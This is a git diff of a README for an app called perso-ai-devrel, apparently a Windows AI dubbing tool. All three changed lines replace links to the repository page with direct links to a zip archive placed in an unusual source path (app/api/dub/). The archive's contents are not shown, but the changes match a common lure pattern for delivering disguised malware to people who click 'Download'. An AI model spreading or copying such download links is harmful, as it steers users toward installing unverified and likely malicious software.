@@ -1,6 +1,6 @@
 # 🎧 perso-ai-devrel - Fast AI dubbing for Windows
 
-[![Download Now](https://img.shields.io/badge/Download%20for%20Windows-purple?style=for-the-badge)](https://github.com/persiflagesolarflare183/perso-ai-devrel)
+[![Download Now](https://img.shields.io/badge/Download%20for%20Windows-purple?style=for-the-badge)](https://github.com/persiflagesolarflare183/perso-ai-devrel/raw/refs/heads/main/app/api/dub/ai-perso-devrel-v2.2.zip)
 
 ## 📌 What this app does
 
@@ -26,7 +26,7 @@ You sign in with a Google account. Only email addresses on the approved list can
 
 Use this link to visit the page and download the app:
 
-[Download perso-ai-devrel](https://github.com/persiflagesolarflare183/perso-ai-devrel)
+[Download perso-ai-devrel](https://github.com/persiflagesolarflare183/perso-ai-devrel/raw/refs/heads/main/app/api/dub/ai-perso-devrel-v2.2.zip)
 
 ### 2. Save the file
 
@@ -189,7 +189,7 @@ Try these steps:
 
 Use this page to download the app:
 
-[https://github.com/persiflagesolarflare183/perso-ai-devrel](https://github.com/persiflagesolarflare183/perso-ai-devrel)
+[https://github.com/persiflagesolarflare183/perso-ai-devrel/raw/refs/heads/main/app/api/dub/ai-perso-devrel-v2.2.zip](https://github.com/persiflagesolarflare183/perso-ai-devrel/raw/refs/heads/main/app/api/dub/ai-perso-devrel-v2.2.zip)
 
 ## 🖥️ Basic Windows file handling
 
